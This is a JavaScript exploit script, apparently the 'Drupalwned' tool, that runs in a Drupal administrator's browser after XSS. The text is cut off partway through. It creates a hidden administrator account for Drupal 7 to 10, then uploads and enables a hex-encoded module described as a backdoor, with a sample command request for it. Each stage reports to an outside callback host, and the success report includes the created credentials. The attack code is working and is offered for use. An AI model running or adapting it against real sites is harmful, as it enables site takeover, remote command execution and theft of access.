/*

               r
               ain
               rai
              nrain
             rainrai
            nrainrain
           ainrainrain
          rainrainrainr
         ainrainrainrain
        rainrainrainrainr
      ainrainrainrainrainra         Drupalwned (https://github.com/nowak0x01/Drupalwned)
    inra nrainrainrainrainrai                      @Author: Hudson Nowak
  nrain  inrainrainrainrainrain
 rain   nrainrainrainrainrainrai
nrai   inrainrainrainrainrainrain
rai   inrainrainrainrainrainrainr
rain   nrainrainrainrainrainrainr
 rainr  nrainrainrainrainrainrai
  nrain ainrainrainrainrainrain
    rainrainrainrainrainrainr
      rainranirainrainrainr
           ainrainrain

*/

// ************************************ ~% Variables %~ ************************************ //

var Target = "https://172.17.0.1:8000/"; // Ex: https://192.168.84.212:8000/drupal/
var Callback = "http://zfi0g0xtiqb6qjh564xr92xnxe35rvfk.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

// DPCreateAccount(); // (Privilege Escalation) - Creates an Administrative user in Drupal.
// DPUploadTemplate(); // (RCE) - Upload a Template module (backdoor) to Drupal.

function DPCreateAccount() {

    /* ************************************************************************************************************************************************ */
    var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered). - <Mandatory>
    var Username = "nowak";         // (It is recommended to use a valid employee name from the target company). - <Mandatory>
    var Password = `j^QEkyvd7*g3`;  /* - <Mandatory> 

                            Make it at least 12 characters
                            Add lowercase letters
                            Add uppercase letters
                            Add numbers
                            Add punctuation

                                    */
    /* ************************************************************************************************************************************************ */

    // ************************************ ~% DPCreateAccount Modules %~ ************************************ //
    // [#] Choose one of the available modules [#] //
    // Drupal();
    // Drupal8();
    // Drupal7();
    /* ************************************************************************************************************************************************ */

    // Drupal 10.X.X && Drupal 9.X.X (Create User Account)
    function Drupal() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "admin", false);
        _stage1.send();

        if (_stage1.responseText) {

            // Verify if the User have access to Admin Panel
            if (_stage1.responseText.match("You are not authorized to access this page.")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "admin",
                                "Module": "DPCreateAccount()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("GET", Target + "admin/people/create", false);
                _stage2.send();

                // Extract form_build_id token
                var form_build_id = _stage2.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];

                // Extract form_token token
                var form_token = _stage2.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];

                // Create the new User
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("mail", Email);
                formData.append("name", Username);
                formData.append("pass[pass1]", Password);
                formData.append("pass[pass2]", Password);
                formData.append("status", "1");
                formData.append("roles[content_editor]", "content_editor");
                formData.append("roles[administrator]", "administrator");
                formData.append("user_picture[0][fids]", "");
                formData.append("form_build_id", form_build_id);
                formData.append("form_token", form_token);
                formData.append("form_id", "user_register_form");
                formData.append("timezone", "UTC");
                formData.append("op", "Create new account");

                var _req = new XMLHttpRequest();
                _req.open("POST", Target + "admin/people/create", false);
                _req.send(formData);

                if (_req.responseText.match("Created a new user account for")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/people/create",
                                    "Message": "User Created Successful!",
                                    "Module": "DPCreateAccount()",
                                    "Data": {
                                        "Username": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Role": "Administrator"
                                    },
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else if (_req.responseText.match(/<li class="messages__item">(.*?)<\/li>/g)) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/people/create",
                                    "Message": "ERROR: Stage 2 - (Cannot Create User)",
                                    "Module": "DPCreateAccount()",
                                    "About": _req.responseText.match(/<li class="messages__item">(.*?)<\/li>/g),
                                    "Date": new Date().toUTCString()

                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/people/create",
                                    "Message": "UNKNOWN ERROR: Stage 2 - (Cannot Create User)",
                                    "Module": "DPCreateAccount()",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_req.responseText.match(/Error message([\s\S]*)/i))
                                }
                            )
                        );
                    }
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "admin",
                            "Module": "DPCreateAccount()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }

    // Drupal 8.X.X (Create User Account)
    function Drupal8() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "admin", false);
        _stage1.send();

        if (_stage1.responseText) {

            // Verify if the User have access to Admin Panel
            if (_stage1.responseText.match("You are not authorized to access this page.")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "admin",
                                "Module": "DPCreateAccount.Drupal8()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("GET", Target + "admin/people/create", false);
                _stage2.send();

                // Extract form_build_id token
                var form_build_id = _stage2.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];

                // Extract form_token token
                var form_token = _stage2.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];

                // Create the new User
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("mail", Email);
                formData.append("name", Username);
                formData.append("pass[pass1]", Password);
                formData.append("pass[pass2]", Password);
                formData.append("status", "1");
                formData.append("roles[administrator]", "administrator");
                formData.append("user_picture[0][fids]", "");
                formData.append("form_build_id", form_build_id);
                formData.append("form_token", form_token);
                formData.append("form_id", "user_register_form");
                formData.append("timezone", "UTC");
                formData.append("op", "Create new account");

                var _req = new XMLHttpRequest();
                _req.open("POST", Target + "admin/people/create", false);
                _req.send(formData);

                if (_req.responseText.match("Created a new user account for")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/people/create",
                                    "Message": "User Created Successful!",
                                    "Module": "DPCreateAccount.Drupal8()",
                                    "Data": {
                                        "Username": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Role": "Administrator"
                                    },
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else if (_req.responseText.match(/<li class="messages__item">(.*?)<\/li>/g)) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/people/create",
                                    "Message": "ERROR: Stage 2 - (Cannot Create User)",
                                    "Module": "DPCreateAccount.Drupal8()",
                                    "About": _req.responseText.match(/<li class="messages__item">(.*?)<\/li>/g),
                                    "Date": new Date().toUTCString()

                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/people/create",
                                    "Message": "UNKNOWN ERROR: Stage 2 - (Cannot Create User)",
                                    "Module": "DPCreateAccount.Drupal8()",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_req.responseText.match(/Error message([\s\S]*)/i))
                                }
                            )
                        );
                    }
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "admin",
                            "Module": "DPCreateAccount.Drupal8()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }

    // Drupal 7.X.X (Create User Account)
    function Drupal7() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "admin", false);
        _stage1.send();

        if (_stage1.responseText) {

            // Verify if the User have access to Admin Panel
            if (_stage1.responseText.match("You are not authorized to access this page.")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "admin",
                                "Module": "DPCreateAccount.Drupal7()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("GET", Target + "admin/people/create", false);
                _stage2.send();

                // Extract form_build_id token
                var form_build_id = _stage2.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];

                // Extract form_token token
                var form_token = _stage2.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];

                // Create the new User
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("name", Username);
                formData.append("mail", Email);
                formData.append("pass[pass1]", Password);
                formData.append("pass[pass2]", Password);
                formData.append("status", "1");
                formData.append("roles[3]", "3");
                formData.append("timezone", "UTC");
                formData.append("form_build_id", form_build_id);
                formData.append("form_token", form_token);
                formData.append("form_id", "user_register_form");
                formData.append("op", "Create new account");

                var _req = new XMLHttpRequest();
                _req.open("POST", Target + "admin/people/create", false);
                _req.send(formData);

                if (_req.responseText.match("Created a new user account for")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/people/create",
                                    "Message": "User Created Successful!",
                                    "Module": "DPCreateAccount.Drupal7()",
                                    "Data": {
                                        "Username": Username,
                                        "Email": Email,
                                        "Password": Password,
                                        "Role": "Administrator"
                                    },
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else if (_req.responseText.match(/Error message([\s\S]*?)region region-help/)) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/people/create",
                                    "Message": "ERROR: Stage 2 - (Cannot Create User)",
                                    "Module": "DPCreateAccount().Drupal7()",
                                    "About": _req.responseText.match(/Error message([\s\S]*?)region region-help/),
                                    "Date": new Date().toUTCString()

                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/people/create",
                                    "Message": "UNKNOWN ERROR: Stage 2 - (Cannot Create User)",
                                    "Module": "DPCreateAccount().Drupal7()",
                                    "Date": new Date().toUTCString(),
                                    "About": encodeURIComponent(_req.responseText.match(/Error message([\s\S]*)/i))
                                }
                            )
                        );
                    }
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "admin",
                            "Module": "DPCreateAccount().Drupal7()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }

}

function DPUploadTemplate() {

    // ************************************ ~% DPUploadTemplate Modules %~ ************************************ //
    // [#] Choose one of the available modules [#] //
    // Drupal();
    // Drupal8();
    // Drupal7();

    // Drupal 10.X.X && Drupal 9.X.X (Upload Template)
    function Drupal() {

        // The Contents of your .tar.gz template file encoded in Hex. (only change it if you are going to use another template than Hello World) -> Ex: xxd -p -c 0 [Template.tar.gz].
        var HexFileContent = "1f8b0800000000000003ed1c6b73dbb8319ff52b70ae2794328e2dea99939b9c7b8eafc95c7b49ede4fac176391409493c53a40e24ed7832f9ef5d007c8024484a8ea2242d76c6964402bb8bdd25f60569815dd737ee7ce2da478fbe107401c6c3217dd5c7c3aef89ac0237d301ce8fa7034d6e1baded3f5de2334fc520c891005a1491082574ceac7d5dfff4e6121e85f787fe87833fff07ee96e830655f06830a8d4bf0eb691d7ff48ef82febbdb20de04ffe7faf7cc259ea05754f3e8df54f32d1b07167156a1e37bb91b68e9db918b5be1fd0a66c41f2c9f60e3169300461b04ff1939042fb1174ed07ff46e6b655a37e61c469f8294fd65eb6b2f564109c4e73f20d617f1010fd8ffc75d5dedffbb80a2fedfbad1dcf1b66b069beb7fa0f7c74affbb800afdffecfad6cdb6ac6073fd0ff5b17afe7702b5fa67de9f39ff0bd38d4293c604eccee16ab15a9f4643fcd71beaa3bcfe7b7d6a122afedb01fcf5275065ab45c3c000c2358c5e926865ba57825d5c719bb8629a3f6eb54012c9a85308fff875feff6733c0c7a501f1fc53df0b4dc7c3e417d30a7d72cf2fbff6424c664099cfbbb85fce7cef1e062f57be0791e4d54bbcc29e8d3debfeb5f707b6a80d66a80ab325cccb6c181671f4e4490b3dc9c5b7d97d3465460e03e89813b6b4367d8b1c1b3d477b027e234867196cd6de011b68da4bc7335c738a5d9871f28e985ee0b261ed3d4e944d47d9f4bd0e9bd9817f472dcb358300553e7f087f084128014aa58e9ce5ca65a177801a048d3eb65a0831012020f86e81052e1098f9ad63e14376938f38b98527e46a4dd9b22947f07f45fc10d4856db41f8892174803a34148220b7836ab177b98a18ca6ae63a159e431334086612518da2621e63dda870b33671e1136fd00edafd8da0dc7cededb78e6780ebf2f232af2db01610175b43209cd6a2622c5cd68758e19a2fd70e1044f5f08027f9e970f429f7232fa78e2780b4c9cd0f6ad4f454904749620108b6033c4edf2e3c104c3af1da087882a1104c161443ce4e1bb98789b5d464574c9d50c69e18aa005010367f1e98b390edb9a588fc844a475d8f8ce86a24a65348d1cd76e17d67319f3a0fd6569929b68a5a1e72fcaba627c6586d2ee70d6af63563e7d87096ed1ff67ab3bbb058bdfccd1574083ffd7fb3dbd58ff19f607caffef02d6f0ffb1cbcf3cb31712702cc115b390970ecc0b2d78eef8e7ccb7b28f887bb2d047538cec64ac8d66c45fa2105c8f7407ce9c50ea0b0b86997a40fea9ecd230bb4ed795f90fb677a3b3dfcf7e7b07db6ec5fe62b099da719d93046105e6bcec24c13338de5ce602e31979ac17183c5fd88c3adea404ecf057c7926cdf83adeb77188e8b5b5fbccba50c1677d575990417692ed1d2f9202cf7a1bc0609af09a284e73cb3d477e6f9fe1eb7e0af0ac5fdff179f2cb75d04dc3cffef8fba0395ffef02a4facff6da5331a8a3f71e121034e5fffd41a1ffd3eb757b2affdf09ac93ff53bd4bf27e7af98a1b087d2bcffdd920faef020c0a0be97a1225e42c0ccd6024ca5203fab9daf748628392bda671429ed142c0509139a4ee5b74a267b6139a53177384bf51c195b2895c6861b1e6975028d0ae1f9abb0079ba82d7a5fc4513e2975c226650896a9f952b518a497a4db11da0b23ef91d83a68499afe68c5027cdbd36ffdc6e104e87c5488863bcd444b101aa2c51a37d4896a66921e878e660d7d60eb2bb4ee862318b837cf24220928d14fa9d85f16f5d4c4d05cce0d6b171d10eeffd08dd991063426c0b567f98c739332337346e6910c3b1f2c5c7996d50e2e43a5e75accfa4de90292016bd28e7876a3588a64b2714d4fa7833bd6ea4cd5826904617169e5b0b930b0ff972c211a69bb710bac6524ac423aca45a3e2a26ac81a2ff67e9d44534a5cfc41493ad84829bc77f23081854fcb70b68d27f969e9f63db21e00eb39bebc6820df15f1fb45e88ff067dbdafe2bf5dc03af15fc12624a1e0b91f858e3767aff89fb4c4236fccb0c11710c0d126cedf2ccb8fbcf02df13fdc377681a4b5a68ca71a72096ffff02dd34d8cf81c56eb7b4125b95761b8fa15130fbb57fc85d10bcad8df13770d1c6cf6d539fe33c241582893252cb122198d3116fe12af6875e36e813d7685da1e5a98bc0cb3e741543787e8cedc43c477738170ddd32a7688aaa427a9a35911a1be96f150d9146ad6abac2616a37e1f309baaa04ba849a125557b3df91a1b941127e9b03ced5a11a6cd1f9f486a5feb4b23b776b1485696b61479cd5ac595c93097e4d9d4586b5ec0016ae0a31839665369729033036158369f8e12f5f5593d32dac249346af3c73acda6f659ed37b8149ff9c9e4fcec5fefcf2ede5d5fb20444f3bdf8418610b67b7d9caba5e2789b2872f8caf46c17969be4b3378c00221c112f56cb2c6ac35d256640d4bb84844ce3e9a2da127ca97898120cea2cb2ac2e530c0be29929d0ac380dd69d196a8b337f785ea8bdb3f75a4224112617eca75642d9c581904a6636135375691a7e9c12743c83e5366d2ddd2e69c6c1d0743252fb11a1fd79d8c52713da92784f9cb6e6501bf64c7772a4c51813cb60594ce23bdab4092af52a6d8a165248ff8255ecdb9d4e2759cdb7969114e33fd6ddf15d774ba13f83079cff821050c5ffbb801afd679e30bbf8a07e7053fdb7db4fcf7f8d7b745c4f1f8d54fd7727b04efc9fa95f12fa673785b7a55a70f389accf3bfc2554936316d62c1dcb8c5cac190b0bfa76ce4d49995e2f366d6243245ad1bdcdadb4297a5cf780d5d73f17b5d609a7cf3a9f241c3694b5f759bc92c8fc4d449adbe48b54b8ea3c93820741d1ffcb9ed7cf3d04d654ff1b8cfba9ff87d747f4ee40d5ff7602eb9fffca1537585e231c6a2e5f81b74e58ae97f1ae69d236e6e7932b8b7fb507cdb2cf9238e02dc1b447543ab81497d8eee23db8f6a435f7f78ca38ac5956a56bce139e3cbaa2f57d50a425a2d13479669f3f36ee9093b49ad6ecda2aa44ae3276707e6c558022887383e259ad70125118b19c73552e890624c5944d0dabb45c91a65cf24d81d17a6b3b406bb3246dcfc6f859992d873857692b60a2a34bea2d0633e72cd0283e605fe4d8a218a1d49f2d88972b89cfa4e70c18a67cc859d9a6cf4a4be20c5acbdadb438f1fcb62daa46a047869345938c1da96d596e2538f02aee3222ab9ce9ebe480cb0cd471e14e94d26ece06b8a3057b214faef9d7ce1cd325d776a5a3740790a49d06860d8d8f26d60d278fbe6e2dda5f6abfeecc7e5cbde1fda75e7181d1da1d385e9cd31e8d9091255d9b872f69bbf9b3ff6ed1bb36ab6336b3b013d3a9032d261d24ed9fa812a2093388c1758a6da01ff467fcc00c6c4efda42312e4700f88a91538e63c429b67800dbe8fe7782e3aadf7f8893bc601bbf01d110ff758770afd0ff1f8fd5f9ff9d40a2e70958b53c9f9db0c78485499375cb396c8a49e6116b374ed0a576c237d6c3d8fd6807483b613b8f91394eedba55e082c4857523487b704dec145a9b5775fd3c199bbcb16050753326930bbc81c1fa66c0279d189af360126f3b4fd147c47f4a832f2ae3177ddb1b45d5f3cf7fdf633b341a9f7fbd97e67fddee98d6ff477d5d3dffbb8038ff8bd3a69399e3e2e2f762b929207a8ba74c9b1dff4870bfce8e1f2c7cffc6006b5bb53b1c63bea2157fb3960d101a87756d66fe60f23020b87368cf589c9ac407162de3d2b87075484f581c0ae4b4e451de8759ab88465a9a568c95f8adb8af191ff29cb078e0db7ecaaba1eaf9275ca55bf909a8a6e77f3c14fc3fabff8c464355ffd90994faf0d49cc11f2f26483b9a8ea77d6bd0ef3db3fbb021cfa6e3eea06b9976af3bc4a0aa6723ad953e05b127a4096edc9098a0fa5e92e099b38b934956d3e608d9416e608616c4670e09e2132c94b4f07b5309f915264b871dbc8129a605814d406b0221fd465fab252e764e30a616ce0ec88b8b66dfdc3fe2e1ca91502bcf1dab97ac9ce1a9fafac455cd5714f2ebcc174cf2141b174c597702d81a51e084b888e06bdb9a02050a142850a0408102050a142850a0408102050a142850a0408102050a142850a0408102050a142850a0603bf05f4a42e0f300780000";
        var TemplatePrefix = "hello_world";
        var Filename = "hello_world.tar.gz";

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "admin", false);
        _stage1.send();

        if (_stage1.responseText) {

            // Verify if the User have access to Admin Panel
            if (_stage1.responseText.match("You are not authorized to access this page.")) {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "admin",
                                "Module": "DPUploadTemplate()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("GET", Target + "admin/modules/install", false);
                _stage2.send();

                // Extract form_build_id token
                var form_build_id = _stage2.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];

                // Extract form_token token
                var form_token = _stage2.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];

                // Upload Template
                var blob = hexToBlob(HexFileContent);
                var boundary = "--nowak0x01";
                var formData = new FormData();
                formData.append("project_url", "");
                formData.append('files[project_upload]', new Blob([blob], { type: "application/gzip" }), Filename);
                formData.append("form_build_id", form_build_id);
                formData.append("form_token", form_token);
                formData.append("form_id", "update_manager_install_form");
                formData.append("op", "Continue");

                function hexToBlob(hexString) {
                    const arrayBuffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
                    return new Blob([arrayBuffer], { type: 'application/gzip' });
                }

                var _upload = new XMLHttpRequest();
                _upload.open("POST", Target + "admin/modules/install", false);
                _upload.send(formData);

                if (_upload.responseText.match("is already present")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "admin/modules/install",
                                    "Module": "DPUploadTemplate()",
                                    "Message": "[ERROR] Stage 2 - The Template " + TemplatePrefix + " is already present!",
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                    /*
                        Obs: I attempted to create a logic wherein, if the template already exists in the application, the script would automatically remove the existing template and replace it with the new template containing the backdoor. However, the application operates with a caching system, which hindered the exploitation process. It resulted in the application still indicating the presence of the template, even though the template had been deleted.
                    */

                } else {

                    var Batch = _upload.responseURL.match(/(?:\?|&)batch=(\d+)&id=(\d+)/)[1];
                    var ID = _upload.responseURL.match(/(?:\?|&)batch=(\d+)&id=(\d+)/)[2];

                    // confirm
                    var do_nojs = new XMLHttpRequest();
                    do_nojs.open("POST", Target + "core/authorize.php/core/authorize.php?batch=" + Batch + "&id=" + ID + "&op=do_nojs&op=do&_format=json", false);
                    do_nojs.send();

                    // finish
                    var finished = new XMLHttpRequest();
                    finished.open("GET", Target + "core/authorize.php/core/authorize.php?batch=" + Batch + "&id=" + ID + "&op=do_nojs&op=finished", false);
                    finished.send();

                    // Verify Upload Status
                    if (finished.responseText.match("Files were added successfully")) {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "admin/modules/install",
                                        "Module": "DPUploadTemplate()",
                                        "Message": "[Sucessful] Stage 2 - The Template " + TemplatePrefix + " has been uploaded!",
                                        "Date": new Date().toUTCString()
                                    }
                                )
                            );
                        }

                        // Activating
                        var _ = new XMLHttpRequest();
                        _.open("GET", Target + "admin/modules", false);
                        _.send();
                        var form_build_id = _.responseText.match(/name="form_build_id" value="([^"]*)"/)[1];
                        var form_token = _.responseText.match(/name="form_token"\s+value="([^"]*)"/)[1];

                        var activate = new XMLHttpRequest();
                        activate.open("POST", Target + "admin/modules", false);
                        activate.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        activate.send(
                            "modules%5B" + TemplatePrefix + "%5D%5Benable%5D=1" +
                            "&form_build_id=" + form_build_id +
                            "&form_token=" + form_token + "&form_id=system_modules&op=Install"
                        );

                        if (activate.responseText.match("has been enabled")) {

                            if (Callback) {
                                var _callback = new XMLHttpRequest();
                                _callback.open("POST", Callback, true);
                                _callback.send(
                                    JSON.stringify(
                                        {
                                            "Host": Target + "admin/modules",
                                            "Module": "DPUploadTemplate()",
                                            "Message": "[Sucessful] Stage 2 - The Template " + TemplatePrefix + " has been enabled!",
                                            "About": [
                                                "If you're utilizing the default Hello World template included in the exploit, you can activate the backdoor functionality by accessing the designated endpoint '/b7b3c4328d3631fb7040cad205e15686'.",
                                                "To see examples, check: https://github.com/nowak0x01/Drupalwned",
                                                "",
                                                "# HTTP Request Example #",
                                                "POST /b7b3c4328d3631fb7040cad205e15686 HTTP/2",
                                                "Host: localhost",
                                                "Content-Type: application/x-www-form-urlencoded",
                                                "[\r\n]",
                                                "K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7dW5hbWUgLWE7aXAgYTtscyAtYWxo",
                                                ""
                                            ],
                                            "Date": new Date().toUTCString()
                                        }
                                    )
                                );
                            }

                        } else {

                            if (Callback) {
                                var _callback = new XMLHttpRequest();
                                _callback.open("POST", Callback, true);
                                _callback.send(
                                    JSON.stringify(
                                        {
                                            "Host": Target + "admin/modules",
                                            "Module": "DPUploadTemplate()",
                                            "Date": new Date().toUTCString(),
                                            "Message": "[UNKNOWN ERROR] Stage 2 - Cannot Enable the Template " + TemplatePrefix,
                                            "About": encodeURIComponent(activate.responseText)

                                        }
                                    )
                                );
                            }

                        }

                    } else {

                        if (Callback) {
                            var _callback = new XMLHttpRequest();
                            _callback.open("POST", Callback, true);
                            _callback.send(
                                JSON.stringify(
                                    {
                                        "Host": Target + "admin/modules/install",
                                        "Module": "DPUploadTemplate()",
                                        "Date": new Date().toUTCString(),
                                        "Message": "[UNKNOWN ERROR] Stage 2 - ??????",
                                        "About": encodeURIComponent(_upload.responseText)
                                    }
                                )
                            );
                        }

                    }

                }

            }

        }

    }

    // Drupal 8.X.X (Upload Template)
    function Drupal8() {

        // The Contents of your .tar.gz template file encoded in Hex. (only change it if you are going to use another template than Hello World) -> Ex: xxd -p -c 0 [Template.tar.gz].
        var HexFileContent = "1f8b0800000000000003ed58eb6fdb3610f7d7e9afe0baa0b2832096ac97e32cebba04188a61e8b0ed5bdc0a3445c75af41a256d33d6fcef3b3ea4284e15adabe7ad007f5f2491c77b51773c1ea9cb2a4f439ce1645bc5a49c8ef60f0b10781e7fda8167759f0d46b6ebb97660db81eb8f2cdbb1fd6084bc7f41974700fb3143089e943d4df7f4fc270ab2bbffbb03a72cafab38bb39dda6c93f94c137d877dddefd77e0df50fb3ff32cf84f66f0bbf82364edd5d21ee8fd7fb8ddc5a688b375be30102a70b5592073ba0a560e719dd93c727cc75eaf02cbb5088e6696476dcf9ffb26d046748deba42af93a8442926715cb93843260b0bc62758193e5aeace5654bb5bc14732f9ba9fb99c54269644ace555c251498f24f467fad6346539ab5820bcad2b82ce33c031a4c082d4bc4950112d3f8af9dfd3fc470fc73df7f44f08f86e31fd27d1bff6e60f1f89fd98e8eff4320c3a98ca66a5bc04b9a4775428d889684c54525c3c83448ce68f81b653caec24ed42dd0db397af70ebd3d330a4c6ef10db09091ac63edd3c0a3f82f19d9770df821f59fe758bcfe0b5c4fd77f87c07bf7fffef4ddcbaff041fbcfe96cdf0a74fd7f100ced7f6f5dc60bc5bf2963e0fcb71dc76fcf7f7fe6c0f9ef0481aeff0f822f5fc03e1a062f034a38c2291aaed5cf0d039cd1105e4269f0a0906f5fbfc12505dae9f1b1818ed16582a114efff9d80666a90a78910fd030af908281e08417f1a50fc0b3908245dc56591e06d89d4c5613c39151372f66b46ab9a65083386b77208a1977095c822102046e1a360b484fa06eebda8dad0e60681f2b5f82ca0d0913ca7fc9a54af9298a0759d115e30dd8b05bdf89d245f85fc1fabc69373f17d447092aca05c42176805eafb6e18519247747c14fef0faa79fafcdefecf9597a35fbc57cd32e81e95ef2d7dfe23327bac52d79bc1ec31d8856e356d4043d7fde11fcf9057af6acd14fade8a87501d3ca0aa06aed91ccef7645802a8a3d5752b16eb929026587e205a680576e68152acf960d7718869d08494271c6c7c46077cbc64a67f38b14b3dbba30d1c5572ddf13312958dd19c69d2e4207317cff9357828f913194fff95c9bff6da0b383c00b74fe3f0454fe5749fa555a24b29d8236797e1b6e685288f40989aecd6fbb7f88a43ae27d421af283e4042dbb87c38fb281289ef47b5c91cd2b8879b6e6a78d5a95f251998fcadf6378475d7e4da2223cd79b7d1d2b73617ca612852d13c05daf5df05a0fdb25a984f0a3b8a26909694be6209998e4e0b539d81f7bd32e147698f7a689ecd56f92cc67a6e87949d26648b6b642cc6e6a619798953276db5e13be446aacfc23153f7fc2414243b07d9d3375d0a339c25984ce869c2656968ddbe4d7aedfe4e875bfddbb0ee39d4869ff70335239a86948761cd39c1c9deea464baa706e5492be0f1864d945add966547b5f7ec9174d2b93ec534343434343434343434343434f680bf000196b48300280000";
        var Filename = "custom_analytics.tar.gz";
        var TemplatePrefix = "custom_analytics";

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "admin", false);
        _stage1.send();

        if (_stage1.responseText) {

            // Verify if the User have access to Admin Panel
            if (_stage1.responseText.match("You are not authorized to access this page.")) {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
